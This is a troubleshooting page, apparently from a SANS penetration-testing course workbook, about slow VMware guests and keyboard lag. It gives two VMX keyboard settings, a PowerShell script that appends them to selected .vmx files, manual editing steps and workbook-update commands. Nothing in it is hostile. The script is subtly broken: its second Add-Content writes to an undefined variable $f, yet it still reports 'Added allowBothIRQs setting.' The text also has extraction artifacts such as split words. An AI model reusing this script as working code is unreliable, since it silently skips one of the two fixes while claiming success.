# *Addressing Poor VMWare Performance On Windows*

# Addressing Power Throttling Settings

Many users of VMware on Windows 11 hosts (and some on Windows 10) have experienced extremely poor performance when running their guest virtual machines (VMs). Their VMs may perform adequately initially, but then perform signi ficantly worse over time, and often exacerbated by running more than one VM. For instructions to fix this issue, please visit https://sansurl.com/winpowercfg. This issue has been documented by many VMware users (ref: https://sansurl.com/vmware-powercfg).

# Keyboard Delays

# *Problem Description*

VMware Workstation (especially versions 17.5+) can experience severe keyboard and mouse issues in Linux-based virtual machines, including:

- Complete keyboard/mouse lockout after 10-15 minutes of use •
- Severe input lag and delayed response •
- Key repeat issues (keys appearing "stuck" or repeating excessively) •
- Input freezing when moving windows or performing certain operations •
- Problems triggered by copy-paste operations •

These issues are related to VMware's Enhanced Keyboard Driver and IRQ handling conflicts, particularly affecting Ubuntu, Linux Mint, LMDE, and other Linux distributions.

### *Solution Overview*

Adding two con figuration parameters to the VM's VMX file resolves these issues:

keyboard.allowBothIRQs = "FALSE" keyboard.vusb.enable = "TRUE"

This issue is documented here: VMWare User Forum

# What these settings do:

- keyboard.allowBothIRQs = "FALSE" Disables dual IRQ handling which can cause input conflicts and timing issues •
- keyboard.vusb.enable = "TRUE" Enables virtual USB keyboard support, improving input handling •

# Addressing Keyboard Delay Settings

#### *Method 1: Using PowerShell (Recommended)*

# Shut down the VM completely

- In VMware Workstation, select the VM 1.
- Go to VM **→** Power **→** Shut Down Guest OS 2.
- Wait for the VM to fully power off 3.
- Ensure the VM status shows "Powered Off" 4.

# Locate and Update the VMX file

Copy and paste the following PowerShell commands into a PowerShell console.

#### Find and Edit VMX Files

```
Get-ChildItem -Path "C:\Users\" -Recurse -Include "*.vmx" -ErrorAction SilentlyContinue |
 Select-Object FullName -Unique |
 Out-GridView -PassThru |
 % { 
 If ( -not ( Select-String 'keyboard.vusb.enable = "TRUE"' $_.FullName ) ) { 
 Add-Content -Path $_.FullName -Value 'keyboard.vusb.enable = "TRUE"'
 Write-Host "Added keyboard.vusb.enable setting" 
 } Else {
 Write-Host "keyboard.vusb.enable setting already present"
 }
 If ( -not ( Select-String 'keyboard.allowBothIRQs = "FALSE"' $_.FullName ) ) { 
 Add-Content -Path $f -Value 'keyboard.allowBothIRQs = "FALSE"'
 Write-Host "Added allowBothIRQs setting." 
 } Else {
 Write-Host "keyboard.allowBothIRQs setting already present"
 }
 }
Write-Host "Done. You can now start your virtual machine."
```

A window should open listing all of the identified VMX files on your computer.

- Select the VMX file for the course VM (Use CTRL + click to select multiple files) 1.
- Click OK 2.

![](SEC560_WorkBook2_page_269_Figure_0.jpeg)

# Power on the VM

- Return to VMware Workstation •
- Start the VM normally •
- If prompted about the VM being moved or copied, select I Copied It •

#### *Method 2: Using a Text Editor*

If you ran the PowerShell script in Method 1, you do not need to perform these steps.

# Locate the VMX File

Right click on the affected VM in MVWare and select Open VM Directory •

# Edit the VMX Files

- Right click on the file highlighted when the window opens. •
- Select Edit with Notepad •

# Add the Configuration Options

Copy the following lines and paste them at the bottom of the file. •

```
keyboard.allowBothIRQs = "FALSE"
keyboard.vusb.enable = "TRUE"
```

Save and close the file. •

# Power on the VM

- Return to VMware Workstation •
- Start the VM normally •
- If prompted about the VM being moved or copied, select I Copied It •

# *Updating the Electronic Workbook (EWB)*

# Windows

In Windows, open a PowerShell prompt and run the following command:

# Command

C:\Users\sec560\workbook-update.ps1

# Linux

In Linux, open a terminal window and run the command below:

#### Command

sh /var/www/html/workbook/resources/workbook-update.sh